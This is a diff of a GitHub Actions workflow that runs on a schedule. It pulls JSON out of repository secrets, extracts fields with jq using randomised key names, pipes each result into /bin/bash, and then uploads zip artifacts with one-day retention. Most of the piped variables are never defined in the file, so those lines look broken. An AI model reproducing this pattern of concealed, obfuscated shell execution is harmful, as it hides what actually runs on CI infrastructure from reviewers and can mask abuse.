@@ -1,24 +1,27 @@
 name: juanshixinshao
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '26 3/6 * * *'
-jobs:  # 22054
+    - cron: '25 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: juanshixinshao
         env:
-          jidyg42651: ${{ secrets.jidyg42651 }}
+          ndcw70: ${{ secrets.ndcw70 }}
         run: |
-          echo $jidyg42651 | jq -r .rwkkw77 | /bin/bash
-          echo $gdz8352 | jq -r .sdw17261 | /bin/bash
-          echo $c84 | jq -r .tkur1 | /bin/bash
-          echo $qek13208 | jq -r .h7476 | /bin/bash
-          echo $lqdb264 | jq -r .pc614 | /bin/bash
-          echo $hu9790 | jq -r .tb566 | /bin/bash
-          echo $n8795 | jq -r .zu78724 | /bin/bash
-          echo $qzmeg74152 | jq -r .jgzz0916 | /bin/bash
+          printf '%s' "$ndcw70" | jq -r .yyv91 | /bin/bash
+          echo $npr84136 | jq -r .ngk39789 | /bin/bash
+          printf '%s' "$oubot40" | jq -r .he2743 | /bin/bash
+          echo $xrnja4600 | jq -r .i1364 | /bin/bash
+          echo $mfzu5 | jq -r .pc2 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SMdi9F78
+          path: "*.zip"
+          retention-days: 1
